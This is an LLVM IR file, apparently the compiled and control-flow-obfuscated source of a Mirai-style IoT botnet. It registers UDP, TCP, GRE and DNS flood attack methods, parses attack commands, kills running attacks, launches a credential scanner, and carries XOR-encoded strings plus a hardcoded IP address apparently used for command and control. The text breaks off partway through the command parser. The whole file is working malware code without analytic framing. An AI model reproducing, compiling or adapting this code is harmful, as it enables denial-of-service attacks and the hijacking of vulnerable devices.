; ModuleID = 'host/ir_bcf/Josho.b.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.30 = type { [16 x i64] }
%struct.timeval.31 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"5:?;\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"165.227.43.162\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  %10 = load i32, i32* @x.1
  %11 = load i32, i32* @y.2
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8 1

originalBBalteredBB:                              ; preds = %originalBB, %0
  %18 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = load i32, i32* @x.3
  %4 = load i32, i32* @y.4
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %13 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %11, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %14 = call noalias i8* @calloc(i64 1, i64 16) #6
  %15 = bitcast i8* %14 to %struct.attack_method*
  store %struct.attack_method* %15, %struct.attack_method** %13, align 8
  %16 = load i8, i8* %11, align 1
  %17 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %18 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %17, i32 0, i32 1
  store i8 %16, i8* %18, align 8
  %19 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %20 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %19, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %21, align 8
  %22 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %23 = bitcast %struct.attack_method** %22 to i8*
  %24 = load i8, i8* @methods_len, align 1
  %25 = zext i8 %24 to i32
  %26 = add nsw i32 %25, 1
  %27 = sext i32 %26 to i64
  %28 = mul i64 %27, 8
  %29 = call i8* @realloc(i8* %23, i64 %28) #6
  %30 = bitcast i8* %29 to %struct.attack_method**
  store %struct.attack_method** %30, %struct.attack_method*** @methods, align 8
  %31 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i8, i8* @methods_len, align 1
  %34 = add i8 %33, 1
  store i8 %34, i8* @methods_len, align 1
  %35 = zext i8 %33 to i64
  %36 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %35
  store %struct.attack_method* %31, %struct.attack_method** %36, align 8
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %45 = alloca i8, align 1
  %46 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %47 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %45, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = call noalias i8* @calloc(i64 1, i64 16) #6
  %49 = bitcast i8* %48 to %struct.attack_method*
  store %struct.attack_method* %49, %struct.attack_method** %47, align 8
  %50 = load i8, i8* %45, align 1
  %51 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %52 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %51, i32 0, i32 1
  store i8 %50, i8* %52, align 8
  %53 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %54 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %55 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %54, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %53, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %55, align 8
  %56 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %57 = bitcast %struct.attack_method** %56 to i8*
  %58 = load i8, i8* @methods_len, align 1
  %59 = zext i8 %58 to i32
  %_ = shl i32 %59, 1
  %_1 = sub i32 0, %59
  %gen = add i32 %_1, 1
  %_2 = shl i32 %59, 1
  %_3 = sub i32 %59, 1
  %gen4 = mul i32 %_3, 1
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %_5 = shl i64 %61, 8
  %_6 = sub i64 %61, 8
  %gen7 = mul i64 %_6, 8
  %_8 = sub i64 0, %61
  %gen9 = add i64 %_8, 8
  %_10 = sub i64 0, %61
  %gen11 = add i64 %_10, 8
  %_12 = shl i64 %61, 8
  %_13 = shl i64 %61, 8
  %62 = mul i64 %61, 8
  %63 = call i8* @realloc(i8* %57, i64 %62) #6
  %64 = bitcast i8* %63 to %struct.attack_method**
  store %struct.attack_method** %64, %struct.attack_method*** @methods, align 8
  %65 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %66 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %67 = load i8, i8* @methods_len, align 1
  %_14 = shl i8 %67, 1
  %68 = add i8 %67, 1
  store i8 %68, i8* @methods_len, align 1
  %69 = zext i8 %67 to i64
  %70 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %66, i64 %69
  store %struct.attack_method* %65, %struct.attack_method** %70, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %37, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %40

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* @x.5
  %7 = load i32, i32* @y.6
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp ne i32 %17, 0
  %19 = load i32, i32* @x.5
  %20 = load i32, i32* @y.6
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %18, label %27, label %33

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = load i32, i32* %1, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = call i32 @kill(i32 %31, i32 9) #6
  br label %33

; <label>:33:                                     ; preds = %27, %originalBBpart2
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %35
  store i32 0, i32* %36, align 4
  br label %37

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* %1, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %1, align 4
  br label %2

; <label>:40:                                     ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %41 = load i32, i32* %1, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %42
  %44 = load i32, i32* %43, align 4
  %45 = icmp ne i32 %44, 0
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = load i32, i32* @x.7
  %4 = load i32, i32* @y.8
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca %struct.attack_option*, align 8
  %20 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store %struct.attack_target* null, %struct.attack_target** %18, align 8
  store %struct.attack_option* null, %struct.attack_option** %19, align 8
  %21 = load i32, i32* %12, align 4
  %22 = sext i32 %21 to i64
  %23 = icmp ult i64 %22, 4
  %24 = load i32, i32* @x.7
  %25 = load i32, i32* @y.8
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  br label %347

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %11, align 8
  %35 = bitcast i8* %34 to i32*
  %36 = load i32, i32* %35, align 4
  %37 = call i32 @ntohl(i32 %36) #7
  store i32 %37, i32* %14, align 4
  %38 = load i8*, i8** %11, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  store i8* %39, i8** %11, align 8
  %40 = load i32, i32* %12, align 4
  %41 = sext i32 %40 to i64
  %42 = sub i64 %41, 4
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %12, align 4
  %44 = load i32, i32* %12, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %63

; <label>:46:                                     ; preds = %33
  %47 = load i32, i32* @x.7
  %48 = load i32, i32* @y.8
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* @x.7
  %56 = load i32, i32* @y.8
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %347

; <label>:63:                                     ; preds = %33
  %64 = load i8*, i8** %11, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %11, align 8
  %66 = load i8, i8* %64, align 1
  store i8 %66, i8* %15, align 1
  %67 = load i32, i32* %12, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 %68, 1
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %12, align 4
  %71 = load i32, i32* %12, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %63
  br label %347

; <label>:74:                                     ; preds = %63
  %75 = load i32, i32* @x.7
  %76 = load i32, i32* @y.8
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i8*, i8** %11, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %11, align 8
  %85 = load i8, i8* %83, align 1
  store i8 %85, i8* %16, align 1
  %86 = load i32, i32* %12, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 %87, 1
  %89 = trunc i64 %88 to i32
  store i32 %89, i32* %12, align 4
  %90 = load i8, i8* %16, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 0
  %93 = load i32, i32* @x.7
  %94 = load i32, i32* @y.8
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %92, label %101, label %102

; <label>:101:                                    ; preds = %originalBBpart28
  br label %347

; <label>:102:                                    ; preds = %originalBBpart28
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = load i8, i8* %16, align 1
  %106 = zext i8 %105 to i64
  %107 = mul i64 5, %106
  %108 = icmp ult i64 %104, %107
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %102
  br label %347

; <label>:110:                                    ; preds = %102
  %111 = load i8, i8* %16, align 1
  %112 = zext i8 %111 to i64
  %113 = call noalias i8* @calloc(i64 %112, i64 24) #6
  %114 = bitcast i8* %113 to %struct.attack_target*
  store %struct.attack_target* %114, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  br label %115

; <label>:115:                                    ; preds = %originalBBpart227, %110
  %116 = load i32, i32* %13, align 4
  %117 = load i8, i8* %16, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %181

; <label>:120:                                    ; preds = %115
  %121 = load i8*, i8** %11, align 8
  %122 = bitcast i8* %121 to i32*
  %123 = load i32, i32* %122, align 4
  %124 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %125 = load i32, i32* %13, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 1
  store i32 %123, i32* %128, align 4
  %129 = load i8*, i8** %11, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 4
  store i8* %130, i8** %11, align 8
  %131 = load i8*, i8** %11, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %11, align 8
  %133 = load i8, i8* %131, align 1
  %134 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %135 = load i32, i32* %13, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  store i8 %133, i8* %138, align 4
  %139 = load i32, i32* %12, align 4
  %140 = sext i32 %139 to i64
  %141 = sub i64 %140, 5
  %142 = trunc i64 %141 to i32
  store i32 %142, i32* %12, align 4
  %143 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %144 = load i32, i32* %13, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i64 %145
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i32 0, i32 0
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %147, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %150 = load i32, i32* %13, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %156 = load i32, i32* %13, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i64 %157
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i32 0, i32 0
  %160 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %159, i32 0, i32 2
  %161 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %160, i32 0, i32 0
  store i32 %154, i32* %161, align 4
  br label %162

; <label>:162:                                    ; preds = %120
  %163 = load i32, i32* @x.7
  %164 = load i32, i32* @y.8
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %162
  %171 = load i32, i32* %13, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %13, align 4
  %173 = load i32, i32* @x.7
  %174 = load i32, i32* @y.8
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br label %115

; <label>:181:                                    ; preds = %115
  %182 = load i32, i32* @x.7
  %183 = load i32, i32* @y.8
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %181
  %190 = load i32, i32* %12, align 4
  %191 = sext i32 %190 to i64
  %192 = icmp ult i64 %191, 1
  %193 = load i32, i32* @x.7
  %194 = load i32, i32* @y.8
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %192, label %201, label %202

; <label>:201:                                    ; preds = %originalBBpart231
  br label %347

; <label>:202:                                    ; preds = %originalBBpart231
  %203 = load i8*, i8** %11, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 1
  store i8* %204, i8** %11, align 8
  %205 = load i8, i8* %203, align 1
  store i8 %205, i8* %17, align 1
  %206 = load i32, i32* %12, align 4
  %207 = sext i32 %206 to i64
  %208 = sub i64 %207, 1
  %209 = trunc i64 %208 to i32
  store i32 %209, i32* %12, align 4
  %210 = load i8, i8* %17, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp sgt i32 %211, 0
  br i1 %212, label %213, label %339

; <label>:213:                                    ; preds = %202
  %214 = load i8, i8* %17, align 1
  %215 = zext i8 %214 to i64
  %216 = call noalias i8* @calloc(i64 %215, i64 16) #6
  %217 = bitcast i8* %216 to %struct.attack_option*
  store %struct.attack_option* %217, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  br label %218

; <label>:218:                                    ; preds = %335, %213
  %219 = load i32, i32* @x.7
  %220 = load i32, i32* @y.8
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %218
  %227 = load i32, i32* %13, align 4
  %228 = load i8, i8* %17, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp slt i32 %227, %229
  %231 = load i32, i32* @x.7
